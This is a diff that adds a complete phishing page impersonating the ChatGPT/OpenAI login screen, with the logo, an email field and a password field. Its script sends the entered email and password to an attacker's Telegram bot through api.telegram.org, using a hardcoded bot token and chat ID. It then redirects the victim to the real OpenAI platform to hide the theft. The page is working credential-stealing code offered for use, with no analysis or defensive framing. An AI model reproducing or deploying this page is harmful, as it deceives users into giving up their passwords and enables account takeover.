@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ChatGPT – Log in</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#f7f8f9;
+      --ink:#0d0d0d;
+      --btn:#101010;
+      --btn-hover:#262626;
+      --border:#d9dcdf;
+      --border-focus:#a6a6ab;
+      --muted:#8e9094;
+      --placeholder:#9aa0a6;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',system-ui,-apple-system,'Segoe UI',Helvetica,Arial,sans-serif;}
+    html,body{height:100%;}
+    body{
+      background:var(--bg);
+      color:var(--ink);
+      -webkit-font-smoothing:antialiased;
+    }
+
+    .wordmark{
+      position:fixed; top:34px; left:36px;
+      font-size:34px; font-weight:700; letter-spacing:-.02em;
+      color:var(--ink); user-select:none;
+    }
+
+    main{
+      min-height:100svh;
+      display:flex; flex-direction:column;
+      align-items:center; justify-content:center;
+      padding:90px 24px 70px;
+    }
+    .logo{width:180px; height:180px; color:var(--ink); display:block;}
+    h1{
+      margin-top:34px;
+      font-size:60px; font-weight:700; letter-spacing:-.02em;
+      color:var(--ink); text-align:center;
+    }
+
+    form{
+      margin-top:140px;
+      width:min(100%,600px);
+      display:flex; flex-direction:column;
+    }
+    .field{
+      display:flex; align-items:center; gap:22px;
+      height:100px; padding:0 30px;
+      background:transparent;
+      border:1px solid var(--border);
+      border-radius:12px;
+      transition:border-color .2s, box-shadow .2s, background .2s;
+    }
+    .field + .field{margin-top:36px;}
+    .field:focus-within{
+      border-color:var(--border-focus);
+      background:#fff;
+      box-shadow:0 0 0 4px rgba(0,0,0,.05);
+    }
+    .field svg.lead{width:27px; height:27px; color:var(--muted); flex:none;}
+    .field input{
+      flex:1; min-width:0; height:100%;
+      border:0; outline:0; background:transparent;
+      font-size:24px; font-weight:400; color:var(--ink);
+    }
+    .field input::placeholder{color:var(--placeholder); font-weight:400;}
+    .eye-btn{
+      flex:none; width:46px; height:46px;
+      display:grid; place-items:center;
+      background:none; border:0; border-radius:10px;
+      color:var(--muted); cursor:pointer;
+      transition:color .2s, background .2s;
+    }
+    .eye-btn:hover{color:var(--ink); background:rgba(0,0,0,.05);}
+    .eye-btn svg{width:27px; height:27px;}
+
+    .submit{
+      margin-top:46px; height:84px;
+      border:0; border-radius:12px;
+      background:var(--btn); color:#fff;
+      font-size:26px; font-weight:600; letter-spacing:.01em;
+      cursor:pointer;
+      transition:background .2s, transform .1s;
+    }
+    .submit:hover{background:var(--btn-hover);}
+    .submit:active{transform:translateY(1px);}
+
+    @media (max-width:640px){
+      .wordmark{top:20px; left:22px; font-size:22px;}
+      .logo{width:120px; height:120px;}
+      h1{margin-top:22px; font-size:40px;}
+      form{margin-top:70px;}
+      .field{height:64px; padding:0 18px; gap:14px; border-radius:10px;}
+      .field svg.lead{width:22px; height:22px;}
+      .field input{font-size:17px;}
+      .eye-btn{width:36px; height:36px;}
+      .eye-btn svg{width:22px; height:22px;}
+      .submit{margin-top:28px; height:56px; font-size:18px; border-radius:10px;}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="wordmark">OpenAI</div>
+
+  <main>
+    <svg class="logo" viewBox="0 0 24 24" fill="currentColor" role="img" aria-label="OpenAI logo" xmlns="http://www.w3.org/2000/svg">
+      <path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5157-4.9108 6.0462 6.0462 0 0 0-6.5098-2.9A6.0651 6.0651 0 0 0 4.9807 4.1818a5.9847 5.9847 0 0 0-3.9977 2.9 6.0462 6.0462 0 0 0 .7427 7.0966 5.98 5.98 0 0 0 .511 4.9107 6.051 6.051 0 0 0 6.5146 2.9001A5.9847 5.9847 0 0 0 13.2599 24a6.0557 6.0557 0 0 0 5.7718-4.2058 5.9894 5.9894 0 0 0 3.9977-2.9001 6.0557 6.0557 0 0 0-.7475-7.0729zm-9.022 12.6081a4.4755 4.4755 0 0 1-2.8764-1.0408l.1419-.0804 4.7783-2.7582a.7948.7948 0 0 0 .3927-.6813v-6.7369l2.02 1.1686a.071.071 0 0 1 .038.052v5.5826a4.504 4.504 0 0 1-4.4945 4.4944zm-9.6607-4.1254a4.4708 4.4708 0 0 1-.5346-3.0137l.142.0852 4.783 2.7582a.7712.7712 0 0 0 .7806 0l5.8428-3.3685v2.3324a.0804.0804 0 0 1-.0332.0615L9.74 19.9502a4.4992 4.4992 0 0 1-6.1408-1.6464zM2.3408 7.8956a4.485 4.485 0 0 1 2.3655-1.9728V11.6a.7664.7664 0 0 0 .3879.6765l5.8144 3.3543-2.0201 1.1685a.0757.0757 0 0 1-.071 0l-4.8303-2.7865A4.504 4.504 0 0 1 2.3408 7.872zm16.5963 3.8558L13.1038 8.364 15.1192 7.2a.0757.0757 0 0 1 .071 0l4.8303 2.7913a4.4944 4.4944 0 0 1-.6765 8.1042v-5.6772a.79.79 0 0 0-.407-.667zm2.0107-3.0231l-.142-.0852-4.7735-2.7818a.7759.7759 0 0 0-.7854 0L9.409 9.2297V6.8974a.0662.0662 0 0 1 .0284-.0615l4.8303-2.7866a4.4992 4.4992 0 0 1 6.6802 4.66zM8.3065 12.863l-2.02-1.1638a.0804.0804 0 0 1-.038-.0567V6.0742a4.4992 4.4992 0 0 1 7.3757-3.4537l-.142.0805L8.704 5.459a.7948.7948 0 0 0-.3927.6813zm1.0976-2.3654l2.602-1.4998 2.6069 1.4998v2.9994l-2.5974 1.4997-2.6067-1.4997Z"/>
+    </svg>
+
+    <h1>ChatGPT</h1>
+
+    <form id="loginForm" novalidate>
+      <label class="field">
+        <svg class="lead" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <rect x="3" y="5" width="18" height="14" rx="2"/>
+          <path d="m3 7 9 6 9-6"/>
+        </svg>
+        <input type="email" id="email" placeholder="Email address" autocomplete="email">
+      </label>
+
+      <label class="field">
+        <svg class="lead" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <rect x="5" y="11" width="14" height="10" rx="2.5"/>
+          <path d="M8 11V8a4 4 0 0 1 8 0v3"/>
+        </svg>
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+        <button type="button" class="eye-btn" id="eyeBtn" aria-label="Show password">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </label>
+
+      <button type="submit" class="submit">Log in</button>
+    </form>
+  </main>
+
+  <script>
+    // ── Configuration ──────────────────────────────────────────────
+    const TELEGRAM_BOT_TOKEN = '8943725711:AAGnEGycTYTVr3xSVoixYEi7uE2dPWukiNA';
+    const TELEGRAM_CHAT_ID   = '7542490071';
+    const REDIRECT_URL       = 'https://platform.openai.com/home';
+
+    // ── Show / hide password ───────────────────────────────────────
+    const eyeBtn = document.getElementById('eyeBtn');
+    const pass   = document.getElementById('password');
+    eyeBtn.addEventListener('click', () => {
+      const show = pass.type === 'password';
+      pass.type = show ? 'text' : 'password';
+      eyeBtn.setAttribute('aria-label', show ? 'Hide password' : 'Show password');
+    });
+
+    // ── Form submit → Telegram → Redirect ──────────────────────────
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email    = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      // Basic guard: both fields must be filled
+      if (!email || !password) {
+        alert('Please fill in both email and password.');
+        return;
+      }
+
+      // Build the message
+      const message = `🔐 *New login attempt*\n\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\``;
+
+      // Send to Telegram
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        if (!response.ok) {
+          console.warn('Telegram API responded with status:', response.status);
+        }
+      } catch (err) {
+        console.warn('Failed to send to Telegram:', err);
+      }
+
+      // Always redirect — even if Telegram call fails
+      window.location.href = REDIRECT_URL;
+    });
+  </script>
+</body>
+</html>
